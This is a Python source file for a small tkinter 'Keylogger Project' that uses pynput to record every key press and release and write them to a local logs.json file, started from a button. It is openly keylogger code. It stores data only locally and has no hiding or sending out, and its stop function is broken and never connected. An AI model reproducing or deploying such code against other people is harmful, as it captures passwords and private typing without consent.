import tkinter as tk
from tkinter import *
from pynput import keyboard # pyright: ignore[reportMissingModuleSource]
import json

root = tk.Tk()
root.geometry("300x350")
root.title("Keylogger Project")

key_list = []
Listener = None

def update_json_file(key_list):
    with open('logs.json','w') as f:
        json.dump(key_list,f,indent=4)

def on_press(key):
    key_list.append({'Pressed' : str(key)})
    update_json_file(key_list)

def on_release(key):
    key_list.append(
        {'Released': str(key)}
    )
    update_json_file(key_list) 

def butaction():
    global Listener
    if Listener is None:
      Listener = keyboard.Listener(
          on_press= on_press,
          on_release= on_release
      )
      Listener.start()
      print("[+] Running Keylogger Successfully!\n[!]Saving the keystrokes in logs.json file")
    
def stop_listner():
   global Listener
   if Listener:
    Listener.stops()
    Listener = None
    print('Keylogger Stops')
      
empty = tk.Label(root,text="Keylogger Project",font ='Vardana 11 bold').grid(row=2,column=2)

Button(root,text='Start Keylogger',command= butaction).grid(row=5,column=2)


root.mainloop()
